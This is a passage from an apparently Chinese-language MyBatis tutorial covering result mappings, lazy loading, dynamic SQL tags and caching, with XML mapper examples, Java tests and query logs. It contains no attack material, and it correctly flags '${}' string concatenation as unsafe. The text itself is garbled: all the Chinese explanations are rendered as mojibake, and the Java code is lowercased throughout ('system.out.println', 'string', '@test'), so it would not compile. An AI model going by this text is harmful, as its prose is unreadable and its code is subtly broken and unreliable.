system.out.println(employeemapper.updateemp(new employee(1, "wangwu", 1, "wangwu@qq.com")));\n    sqlsession.commit();  // ç±äºmybatisé»è®¤å³é­äºèªå¨æäº¤åè½ å æ­¤éè¦æå¨æäº¤æ§è¡æä¼å½±åæ°æ®åº\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# ä¼ å¥åæ°å¤ç\n\n 1. ä¼ éåä¸ªåæ°ï¼#{ä»»æ} mybatisä¸åå¤ç\n 2. å¤ä¸ªåæ°ï¼\n    * sqlä¸­ä½¿ç¨#{åæ°å}åæ¥å£åä¸­ä¼ éçåæ°ååï¼è¿ç§æ¹å¼ä¼åºéï¼å¤ä¸ªåæ°ä¼è¢«å°è£æmapï¼#{}ä»mapä¸­åå¼ï¼å¯ä»¥ä½¿ç¨param1,param2æè0ï¼1ç´æ¥åå¼ã\n    * å½ååæ°ï¼ä½¿ç¨æ³¨è§£æ¹åå°å°è£mapçkeyï¼@param("id")ï¼ç´æ¥ä½¿ç¨#{id}åå¼\n 3. å¦æå¤ä¸ªåæ°ï¼ä½¿ç¨pojoå¯¹è±¡ï¼#{}ä¼ épojoå¯¹è±¡å±æ§\n 4. ç´æ¥ä¼ å¥mapï¼#{key}ä¼ émapå¯¹è±¡å¯¹åºçkeyå¼ã\n 5. ç»å¸¸è¦ä½¿ç¨çå¤ä¸ªåæ°ï¼å¯ä»¥å°è£ætoå¯¹è±¡ã\n 6. å¦æä¼ éçæ¯collection(set list)ãæ°ç»ï¼ä¹ä¼è¿è¡ç¹æ®å°è£å°mapä¸­ï¼listä½¿ç¨#{list[0]}ï¼æ°ç»ä½¿ç¨#{array[0]}\n\n\n\n\n# æ¥è¯¢ç»æè¿å\n\n * å¦æè¿åçæ¯ä¸ä¸ªéåï¼åresulttypeè¿åéåçæ³åã\n\n    <select id="selectallemp" resulttype="employee">\n        select * from tbl_employee\n    </select>\n\n\n1\n2\n3\n\n * å¦æè¿åä¸ä¸ªmapï¼keyæ¯ååï¼valueæ¯å¼çåå®¹ï¼resulttypeåæ¯mapã\n\n    <select id="selectbyid" resulttype="map">\n        select * from tbl_employee where id=#{id}\n    </select>\n\n\n1\n2\n3\n\n * å¦æè¿åä¸ä¸ªmapï¼keyæ¯ä¸»é®ï¼valueæ¯ææçæ¥è¯¢ç»æãresulttypeæ¯mapä¸­å°è£çç±»åï¼å¹¶ç»æ¹æ³å ä¸@mapkeyæ³¨è§£ï¼ææä¸»é®ã\n\n<select id="selectall" resulttype="employee">\nselect * from tbl_employee\n</select>\n\n\n1\n2\n3\n\n\n    @mapkey("id")\n    map<integer,employee> selectall();\n\n\n1\n2\n\n\n\n# å°è£è¿åç»æ\n\nå½æ°æ®åºåååæä»¬å®ä¹çjavabeanå±æ§åä¸ä¸è´æ¶ï¼ä½¿ç¨resulttypeæå®è¿åå¼ç±»åå°ä¼å¯¼è´æ¥åºæ¥çæ°æ®æ æ³æ³¨å¥å°ç»æä¸­ãæä¸ç§è§£å³æ¹å¼ï¼\n\n * å¦ææ°æ®åºä¸­çåååjavabeanå±æ§åæ»¡è¶³é©¼å³°å½åæ³çè½¬æ¢ï¼åå¨mybatiséç½®æä»¶ä¸­å¼å¯é©¼å³°å½åæ³è½¬æ¢å³å¯\n * æ¥è¯¢æ°æ®åºè¯­å¥èµ·å«å\n * ä½¿ç¨resultmapå°è£è¿åç»æ\n\n<resultmap id="emp" type="com.pwddd.mybatis.bean.employee">\n    <id property="id" column="id" />\n    <result property="lastname" column="last_name" />\n    <result property="gender" column="gender" />\n    <result property="email" column="email" />\n</resultmap>\n<select id="selectbyid" resultmap="emp">\n    select * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# èåæ¥è¯¢çç»æè¿å\n\n# æ¹å¼ä¸ï¼ä½¿ç¨çº§èèµå¼æ¹å¼\n\n<resultmap id="empanddept" type="com.pwddd.mybatis.bean.employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastname" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    <result column="did" property="dept.did" />\n    <result column="dname" property="dept.dname" />\n</resultmap>\n\n<select id="selectempanddeptbyid" resultmap="empanddept">\n    select *\n    from tbl_employee e , tbl_dept d\n    where e.did = d.did\n    and e.id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# æ¹å¼äºï¼ä½¿ç¨associationèµå¼\n\n<resultmap id="empanddept" type="com.pwddd.mybatis.bean.employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastname" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    \x3c!--        <result column="did" property="dept.did" />--\x3e\n    \x3c!--        <result column="dname" property="dept.dname" />--\x3e\n    <association property="dept" javatype="com.pwddd.mybatis.bean.dept">\n        <id column="did" property="did" />\n        <result column="dname" property="dname" />\n    </association>\n</resultmap>\n\n<select id="selectempanddeptbyid" resultmap="empanddept">\n    select *\n    from tbl_employee e , tbl_dept d\n    where e.did = d.did\n    and e.id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# æ¹å¼ä¸ï¼åæ­¥æ¥è¯¢\n\n 1. æç§åå·¥idæ¥åºåå·¥ä¿¡æ¯\n 2. æ ¹æ®æ¥è¯¢çåå·¥ä¿¡æ¯ä¸­çdid æ¥è¯¢å¯¹åºçdeptä¿¡æ¯\n 3. å°é¨é¨è®¾ç½®å°deptå±æ§ä¸­\n\n<resultmap id="step" type="com.pwddd.mybatis.bean.employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastname" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    <association property="dept" select="com.pwddd.mybatis.mapper.deptmapper.selectbyid" column="did" >\n        <id column="did" property="did" />\n        <result column="dname" property="dname" />\n    </association>\n</resultmap>\n<select id="getempbyidstep" resultmap="step">\n    select * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åºäºåæ­¥æ¥è¯¢çå»¶è¿å è½½åè½\n\nmybatiséç½®æä»¶ä¸­å¢å å¼å¯æå è½½éç½®ï¼\n\n<setting name="lazyloadingenabled" value="true"/>\n\x3c!--        æç§éè¦è¿è¡å±æ§çå è½½--\x3e\n<setting name="aggressivelazyloading" value="false"/>\n\n\n1\n2\n3\n\n\nåªä½¿ç¨employeeä¸­çå­æ®µæ¶ï¼å°±åªæ¥è¯¢ä¸æ¡sqlè¯­å¥\n\n@test\npublic void teststep() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    employeemapperplus mapper1 = sqlsessionfactory.opensession().getmapper(employeemapperplus.class);\n    employee empbyidstep = mapper1.getempbyidstep(1);\n    system.out.println(empbyidstep.getemail());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n[2022-02-20 20:23:29:798-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: select * from tbl_employee where id = ?\n[2022-02-20 20:23:29:799-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: 1(integer)\n[2022-02-20 20:23:29:841-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - &lt;==      total: 1\nwangwu@qq.com\n\n\n1\n2\n3\n4\n\n\nå½æ¶ç¨å°deptä¸­æ¥è¯¢çå­æ®µæ¶åå è½½ç¬¬äºæ¡sqlè¯­å¥\n\n@test\npublic void teststep() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    employeemapperplus mapper1 = sqlsessionfactory.opensession().getmapper(employeemapperplus.class);\n    employee empbyidstep = mapper1.getempbyidstep(1);\n    system.out.println(empbyidstep.getemail());\n    system.out.println("============================================");\n    system.out.println(empbyidstep.getdept().getdid());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n[2022-02-20 20:26:02:673-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: select * from tbl_employee where id = ?\n[2022-02-20 20:26:02:702-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: 1(integer)\n[2022-02-20 20:26:02:748-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - &lt;==      total: 1\nwangwu@qq.com\n============================================\n[2022-02-20 20:26:02:748-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: select * from tbl_dept where did = ?\n[2022-02-20 20:26:02:749-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: 1(integer)\n[2022-02-20 20:26:02:751-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - &lt;==      total: 1\n1\n\nprocess finished with exit code 0\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# èåæ¥è¯¢çéåç»æè¿å\n\nä¸ä¸ªé¨é¨æå¤ä¸ªåå·¥ï¼æ¥è¯¢é¨é¨æ¶ï¼è¿åé¨é¨ä¸çææåå·¥ã\n\n# æ¹å¼ä¸ï¼å¤è¡¨èåæ¥è¯¢\n\n<resultmap id="depts" type="com.pwddd.mybatis.bean.dept" >\n    <id column="did" property="did" />\n    <result column="dname" property="dname" />\n    \x3c!-- oftype å®ä¹éåä¸­çæ³åç±»å--\x3e\n    <collection property="employees" oftype="com.pwddd.mybatis.bean.employee" >\n        <id column="id" property="id" />\n        <result column="last_name" property="lastname" />\n        <result column="email" property="email" />\n        <result column="gender" property="gender" />\n    </collection>\n\n</resultmap>\n<select id="getdeptbyid" resultmap="depts" >\n    select e.id,e.last_name,e.email,e.gender,d.did,d.dname\n    from tbl_employee e, tbl_dept d\n    where d.did = e.did\n    and e.did = #{did}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# æ¹å¼äºï¼åæ­¥æ¥è¯¢\n\n<resultmap id="deptsstep" type="com.pwddd.mybatis.bean.dept" >\n    <id column="did" property="did" />\n    <result column="dname" property="dname" />\n    <collection property="employees" select="com.pwddd.mybatis.mapper.employeemapperplus.getempbydid"\n                oftype="com.pwddd.mybatis.bean.employee" column="did" />\n</resultmap>\n\n<select id="getdeptbystep" resultmap="deptsstep" >\n    select * from tbl_dept where did = #{did}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å¤åstepæ¥è¯¢\n\nå¦æéè¦åæ­¥æ¥è¯¢ï¼ç¬¬ä¸æ­¥æ¥è¯¢çç»æçå¤åä½ä¸ºç¬¬äºæ­¥æ¥è¯¢çæ¡ä»¶ï¼å¯ä»¥å°è£æmap\n\ncolumn="{did=did,dname=dname}"\n\n\n1\n\n\n\n# å³äºå»¶è¿å è½½\n\néå¯¹åæ­¥æ¥è¯¢å¯ä»¥åç¬è®¾ç½®æå è½½\n\n fetchtype="eager" ä¸å¼å¯æå è½½\n  fetchtype="lazy" å¼å¯æå è½½\n\n\n1\n2\n\n\n\n# é´å«å¨\n\né´å«å¨å¯ä»¥æ ¹æ®æ¡ä»¶è®¾ç½®æ¥è¯¢çç»æï¼æ¯å¦å¦ææ¯å¥³çæå°deptçç»æè¿åï¼å¦ææ¯ç·çï¼åå°lastnameçå¼èµå¼ç»emailçå¼ãè½ç¶æ²¡ææä¹ï¼åªç¨æ¥æµè¯ã\n\n<resultmap id="gete" type="com.pwddd.mybatis.bean.employee" >\n<id column="id" property="id" />\n<result column="last_name" property="lastname" />\n<result column="gender" property="gender" />\n<result column="email" property="email" />\n<discriminator javatype="string" column="gender">\n<case value="0">\n<association property="dept" select="com.pwddd.mybatis.mapper.deptmapper.selectbyid" column="did"/>\n</case>\n<case value="1">\n<result column="last_name" property="email" />\n</case>\n</discriminator>\n</resultmap>\n\n\n<select id="gete" resultmap="gete" >\nselect * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¨æsqlè¯­å¥\n\nå¨æsqlè§£å³çæ¯æç§æ¡ä»¶æ¼è£sqlçé®é¢ãä½¿ç¨ä¸åçæ ç­¾ï¼mybatiså¯ä»¥æ ¹æ®ä¼ éçåæ°æ¡ä»¶å¨æçæ¼æ¥sqlè¯­å¥ã\n\n\n# ifæ ç­¾\n\nifæ ç­¾å¯ä»¥æ ¹æ®ä¼ å¥çåæ°å¤æ­æ¯å¦æ¼æ¥æ¥è¯¢æ¡ä»¶\n\n<select id="getempsbycondition" resulttype="employee" >\n    select * from tbl_employee\n    where\n    <if test="id!=null" >\n        id = #{id}\n    </if>\n\n    <if test="lastname != null">\n        and last_name=#{lastname}\n    </if>\n\n    <if test="email != null">\n        and email = #{email}\n    </if>\n\n    <if test="gender != null">\n        and gender = #{gender}\n    </if>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# whereæ ç­¾\n\nè¿ç§æ¼æ¥æä¸ä¸ªé®é¢ï¼å°±æ¯å½idä¸å­å¨æ¶ï¼åé¢çè¯­å¥æ¼æ¥ä¼å¤ä¸ä¸ªandãå¸¸è§çè§£å³æ¹æ³æä¸¤ä¸ªï¼\n\n 1. where åé¢æ¼æ¥ä¸ä¸ª 1=1\n 2. ä½¿ç¨whereæ ç­¾ï¼å»é¤åç½®çand æè oræ¡ä»¶\n\nç¬¬ä¸ç§æ¹å¼ï¼\n<select id="getempsbycondition" resulttype="employee" >\n    select * from tbl_employee\n    where 1=1\n    <if test="id!=null" >\n        and id = #{id}\n    </if>\n\n    ç¬¬äºç§æ¹å¼ï¼\n    <select id="getempsbycondition" resulttype="employee" >\n        select * from tbl_employee\n        <where>\n            <if test="id!=null" >\n                id = #{id}\n            </if>\n\n            <if test="lastname != null">\n                and last_name=#{lastname}\n            </if>\n\n            <if test="email != null">\n                and email = #{email}\n            </if>\n\n            <if test="gender != null">\n                and gender = #{gender}\n            </if>\n        </where>\n    </select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nä¸é¢çè¿ç§åæ³ï¼å¦æå¨æ¼æ¥æ¡ä»¶æ¶ï¼andåå¨æ¡ä»¶åé¢è¿ä¼åºé®é¢ï¼å ä¸ºwhereæ ç­¾åªä¼å é¤æç¬¬ä¸ä¸ªå¤ä½çandã\n\n<select id="getempsbycondition" resulttype="employee" >\n    select * from tbl_employee\n    <where>\n        <if test="id!=null" >\n            id = #{id} and\n        </if>\n\n        <if test="lastname != null">\n            last_name=#{lastname} and\n        </if>\n\n        <if test="email != null">\n            email = #{email} and\n        </if>\n\n        <if test="gender != null">\n            gender = #{gender}\n        </if>\n    </where>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# trimæ ç­¾\n\nä½¿ç¨trimæ ç­¾ï¼å¯ä»¥è§£å³ä¸è¿°é®é¢ï¼trimæ ç­¾æå¦ä¸çå±æ§ï¼\n\n * prefix : ç»è¯­å¥å ä¸ä¸ä¸ªåç¼\n * prefixoverides : è¦çæåç¼çå­ç¬¦ä¸²\n * suffix : ç»è¯­å¥å ä¸ä¸ä¸ªåç¼\n * suffixoverrides : è¦çæåç¼çå­ç¬¦ä¸²\n\nä¸è¿°çæ¥è¯¢å¯ä»¥æ¹æå¦ä¸åå®¹ï¼\n\n<select id="getempsbycondition" resulttype="employee" >\n    select * from tbl_employee\n    <trim prefix="where" suffixoverrides="and">        \n        <if test="id!=null" >\n            id = #{id} and\n        </if>\n\n        <if test="lastname != null">\n            last_name=#{lastname} and\n        </if>\n\n        <if test="email != null">\n            email = #{email} and\n        </if>\n\n        <if test="gender != null">\n            gender = #{gender}\n        </if>\n    </trim>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# chooseæ ç­¾\n\nchooseæ ç­¾ç±»ä¼¼äºjavaä¸­çswitch-caseè¯­å¥ã\n\n<select id="getempsbyconditionchoose" resulttype="employee">\n    select * from tbl_employee\n    <where>\n        <choose>\n            <when test="id!=null">\n                id = #{id}\n            </when>\n\n            <when test="lastname != null">\n                and last_name = #{lastname}\n            </when>\n\n            <otherwise>\n                and gender = 1\n            </otherwise>\n        </choose>\n    </where>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# setæ ç­¾\n\nwhereæ ç­¾ä¸­å°è£çæ¯æ¥è¯¢çæ¡ä»¶ï¼èsetæ ç­¾ä¸­å°è£çæ¯æ´æ°æ¡ä»¶ã\n\nå¦ææä»¬ä¸ä½¿ç¨setæ ç­¾ï¼èä½¿ç¨ifæ ç­¾æ¼æ¥updateè¯­å¥çsetæ¡ä»¶çè¯ï¼åä¼å¯¼è´åé¢å¤ä¸ä¸ªéå·ï¼sqlæ§è¡æ¥éã\n\n<update id="updateemp">\n    update tbl_employee\n    set\n    <if test="lastname != null">\n        last_name = #{lastname},\n    </if>\n    <if test="gender != null">\n        gender = #{gender},\n    </if>\n    <if test="email != null" >\n        email = #{email}\n    </if>\n\n    where id = #{id}\n</update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n[2022-02-21 14:33:36:972-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: update tbl_employee set last_name = ?, where id = ?\n[2022-02-21 14:33:36:997-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: lisi(string), 1(integer)\n\n\n1\n2\n\n\nä½¿ç¨setæ ç­¾å¯ä»¥å»é¤åé¢å¤ä½çéå·ã\n\n<update id="updateemp">\n    update tbl_employee\n    <set>\n        <if test="lastname != null">\n            last_name = #{lastname},\n        </if>\n        <if test="gender != null">\n            gender = #{gender},\n        </if>\n        <if test="email != null" >\n            email = #{email}\n        </if>\n    </set>\n    where id = #{id}\n</update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# foreachæ ç­¾\n\nforeachæ ç­¾ç¨æ¥éåä¼ éè¿æ¥çlistæèmapï¼å¸¸ç¨æ¥åinæ¥è¯¢æèæ¹éæ°å¢ã\n\nforeachæ ç­¾æå¦ä¸çå±æ§å¯ä»¥éæ©ï¼\n\n * collection: ä¼ è¿æ¥çéååæ°\n * item: éååºæ¥çåä¸ªå¼\n * open: foreachæ¼æ¥çå¼å§ç¬¦å·\n * close: foreachæ¼æ¥çç»æç¬¦å·\n * separator: åç´ ä¹é´çåéç¬¦\n * index: å¯¹äºlistæ¥è¯´ï¼indexæ¯ç´¢å¼ï¼itemæ¯valueï¼å¯¹äºmapèè¨ï¼indexæ¯keyï¼itemæ¯value\n\ninæ¥è¯¢employee\n\n<select id="getempsbyin" resulttype="employee">\n    select * from tbl_employee\n    where id in\n    <foreach collection="list" item="id" open="(" separator="," close=")">\n        #{id}\n    </foreach>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ninsertæ¹éæå¥æ°æ®\n\n<insert id="addemps" >\n    insert into tbl_employee(id,last_name,gender,email)\n    values\n    <foreach collection="collection"  separator="," item="emp">\n        (#{emp.id},#{emp.lastname},#{emp.gender},#{emp.email})\n    </foreach>\n</insert>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nç¬¬äºç§æ¹å¼éè¦æ°æ®åºå¼å¯å¯ä»¥æ¹éæäº¤\n\njdbc.url=jdbc:mysql://localhost:3306/mybatis?allowmultiqueries=true\n\n\n1\n\n\n<insert id="addemps" >\n    <foreach collection="list" item="emp" separator=";" >\n        insert into tbl_employee(id,last_name,gender,email)\n        values (#{emp.id},#{emp.lastname},#{emp.gender},#{emp.email})\n    </foreach>\n</insert>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ä¸¤ä¸ªåç½®åæ°\n\nmybatisä¸­æä¸¤ä¸ªåç½®åæ°å¯ä»¥ç¨æ¥åå¼ã\n\n * _parameter: ä»£è¡¨æ´ä¸ªåæ°ï¼å¦æä¼ éå¤ä¸ªåæ°ï¼åæ°ä¼è¢«å°è£æä¸ä¸ªmap _parameterå°±ä»£è¡¨è¿ä¸ªmap\n * _databaseid: å¦æéç½®äºdatabaseidprovideræ ç­¾ï¼åè¯¥å¼å°±ä»£è¡¨æä»¬éç½®çå¼ã\n\næ å­ï¼\n\n<select id="getdept" resulttype="dept" >\n    <if test="_databaseid=mysql">\n        select * from tbl_dept where did = #{did}\n    </if>\n</select>\n\n\n1\n2\n3\n4\n5\n\n\n\n# bindæ ç­¾\n\nbindæ ç­¾å¯ä»¥å°ognlè¡¨è¾¾å¼ç»å®å°ä¸ä¸ªåéä¸ãæä»¬å¯ä»¥ä½¿ç¨å¦ä¸çæ¹å¼è¿è¡æ¨¡ç³æ¥è¯¢\n\nsystem.out.println(mapper.getlikeemp("%a%"));\n\n\n1\n\n\næä»¬ä¹å¯ä»¥å°%æ¾å°sqlè¯­å¥ä¸­ï¼ä½ä¸è½ä½¿ç¨ä¸é¢çæ¹å¼ï¼\n\nselect * from tbl_employee\nwhere last_name like "%#{lastname}%"  -- likeåé¢çæ¥è¯¢æ¡ä»¶åºè¯¥æ¯ä¸ä¸ªæ´ä½\nselect * from tbl_employee\nwhere last_name like "%${lastname}%"  -- æ¼æ¥ä¸å®å¨\n\n\n1\n2\n3\n4\n\n\næä»¬å¯ä»¥ä½¿ç¨bindå°æ¼æ¥è¿è¡ç»å®\n\n<select id="getlikeemp" resulttype="employee">\n    <bind name="_lastname" value="\'%\'+lastname+\'%\'"/>\n    select * from tbl_employee\n    where last_name like #{_lastname}\n</select>\n\n\n1\n2\n3\n4\n5\n\n\n\n# sqlæ ç­¾\n\nsqlæ ç­¾å¯ä»¥å°å¤æ¬¡çæ¥è¯¢è¯­å¥è¿è¡ä¿å­ï¼ä¸æ¬¡ä½¿ç¨ç´æ¥å¼ç¨ãå¯ä»¥ä½¿ç¨inclueè¿è¡å¼ç¨ã\n\n\n<sql id="emp">\n    id,last_name,email,gender\n</sql>\n\n<select id="getlikeemp" resulttype="employee">\n    <bind name="_lastname" value="\'%\'+lastname+\'%\'"/>\n    select \n    <include refid="emp" />\n    from tbl_employee\n    where last_name like #{_lastname}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\ninclueæ ç­¾åå¯ä»¥èªå®ä¹ä¸äºå±æ§ï¼ç¶åä½¿ç¨${}åå¼ã\n\n<sql id="emp">\n    id,${name},email,gender\n</sql>\n\n<select id="getlikeemp" resulttype="employee">\n    <bind name="_lastname" value="\'%\'+lastname+\'%\'"/>\n    select\n    <include refid="emp" >\n        <property name="name" value="last_name"/>\n    </include>\n    from tbl_employee\n    where last_name like #{_lastname}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# ç¼å­\n\nmybatisä¸­åå«äºä¸ä¸ªéå¸¸å¼ºå¤§çæ¥è¯¢ç¼å­ç¹æ§ï¼å¯ä»¥éå¸¸æ¹ä¾¿çéç½®åå®å¶ãç¼å­å¯ä»¥æå¤§çæåæ¥è¯¢æçã\n\nmybatisç³»ç»ä¸­é»è®¤å®ä¹äºä¸¤çº§ç¼å­ãä¸çº§ç¼å­ï¼äºçº§ç¼å­ã\n\n 1. é»è®¤æåµä¸ï¼åªæä¸çº§ç¼å­ï¼sqlsessionçº§å«çç¼å­ï¼æ¬å°ç¼å­ï¼å¼å¯ã\n 2. äºçº§ç¼å­éè¦æå¨éç½®ï¼æ¯namespaceçº§å«çç¼å­\n 3. ä¸ºäºæé«æ©å±æ§ãmybatiså®ä¹äºç¼å­æ¥å£cacheï¼æä»¬å¯ä»¥å®ç°cacheæ¥å£å®ç°å®ä¹äºçº§ç¼å­ã\n\n\n# ä¸çº§ç¼å­\n\nä¸æ°æ®åºåä¸æ¬¡ä¼è¯äº§ççæ°æ®ä¼æ¾å°ä¸çº§ç¼å­ä¸­ï¼ä»¥åå¦æéè¦åç¸åçæ°æ®åç´æ¥ä»ç¼å­ä¸­åã\n\n@test\npublic void testfirstlevel() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    sqlsession sqlsession = sqlsessionfactory.opensession();\n\n    try {\n        employeemappercache mapper = sqlsession.getmapper(employeemappercache.class);\n        system.out.println(mapper.getemp(1));\n        system.out.println(mapper.getemp(1));\n    }finally {\n        sqlsession.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\næ¥è¯¢ç»æå¯ä»¥çåºï¼åªæ§è¡äºä¸æ¬¡æ¥è¯¢\n\n[2022-02-21 19:26:09:969-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: select * from tbl_employee where id = ?\n[2022-02-21 19:26:09:994-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: 1(integer)\n[2022-02-21 19:26:10:011-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - &lt;==      total: 1\nemployee{id=1, lastname=\'wangwu\', gender=0, email=\'wangwu@qq.com\', dept=null}\nemployee{id=1, lastname=\'wangwu\', gender=0, email=\'wangwu@qq.com\', dept=null}\n\n\n1\n2\n3\n4\n5\n\n\næä»¥ä¸å ç§æåµå¯¼è´ç¼å­å¤±æï¼\n\n * ä¸åçsqlsession\n * sqlsessionç¸åï¼æ¥è¯¢æ¡ä»¶ä¸å - ç¼å­ä¸­æ²¡æ\n * sqlsessionç¸åï¼ä¸¤æ¬¡æ¥è¯¢ä¹é´æå¢å æ¹æ¥æä½\n * sqlsessionç¸åï¼è°ç¨ç¼å­æ¸ç©ºsqlsesson.clearcache()\n\n\n# äºçº§ç¼å­\n\nä¸åçsqlsessionæ æ³ä½¿ç¨ä¸çº§ç¼å­ï¼èå´è¾å°ãå½æä»¬éè¦ä¸åçsqlsessionå¯ä»¥ä»ç¼å­ä¸­æ¥æ¾æ°æ®ï¼åéè¦å¼å¯äºçº§ç¼å­ãäºçº§ç¼å­çä½ç¨åæ¯namespaceã\n\näºçº§ç¼å­æºå¶ï¼\n\n 1. ä¸ä¸ªä¼è¯ï¼æ¥è¯¢ä¸æ¡è¯­å¥ï¼è¿ä¸ªæ°æ®ä¼è¢«å­å¨å¨ä¸çº§ç¼å­ä¸­ã\n 2. ä¼è¯å³é­ï¼ä¸çº§ç¼å­ä¸­çæ°æ®ä¼è¢«ä¿å­å°äºçº§ç¼å­ä¸­ï¼æ°çæ¥è¯¢ä¼è®¿é®äºçº§ç¼å­ã\n 3. ä¸åçnamespaceæ¥è¯¢çæ°æ®ä¼å¯¹åºèªå·±çç¼å­ç©ºé´ã\n\nä½¿ç¨æ¹æ³ï¼\n\n 1. å¼å¯å¨å±äºçº§ç¼å­éç½®\n\n<setting name="cacheenabled" value="true"/>\n\n\n1\n\n 2. å»mapperä¸­éç½®äºçº§ç¼å­\n\n<cache></cache>\n\n\n1\n\n\näºçº§ç¼å­éç½®æä»¥ä¸å¯éåæ°ï¼\n\n * blocking:\n * eviction: ç¼å­çåæ¶ç­ç¥\n   * lru: æè¿æå°ä½¿ç¨çï¼ç§»é¤é¿æ¶é´æªè¢«è®¿é®çå¯¹è±¡\n   * fifo: åè¿ååºï¼æç§å¯¹è±¡å­å¨çé¡ºåºï¼åè¿æ¥çååºå»\n   * soft: è½¯å¼ç¨ï¼ç§»é¤åºäºåå¾åæ¶å¨ç¶æåè½¯å¼ç¨çå¯¹è±¡\n   * weak: å¼±å¼ç¨ï¼æ´ç§¯æçç§»é¤åºäºåå¾æ¶éå¨ç¶æåå¼±å¼ç¨çç¸å³å¯¹è±¡\n   * é»è®¤ï¼lru\n * flushintervalï¼ç¼å­å·æ°æ¶é´ï¼é»è®¤ä¸æ¸ç©º\n * readonly\n   * trueï¼ åªè¯»ï¼mybatisè®¤ä¸ºææç¼å­ä¸­çæ°æ®é½æ¯åªè¯»æä½ï¼ä¸ä¼ä¿®æ¹æ°æ®ãä¸ºäºå å¿«éåº¦ï¼ä¼å°ç¼å­ä¸­çåå®¹ç´æ¥äº¤ç»ç¨æ·ï¼ä¸å®å¨éåº¦å¿«ã\n   * falseï¼ éåªè¯»ï¼mybatisè§å¾æ°æ®æ¯å¯ä»¥è¢«ä¿®æ¹çãmybatisä¼å©ç¨åºååç­ææ¯å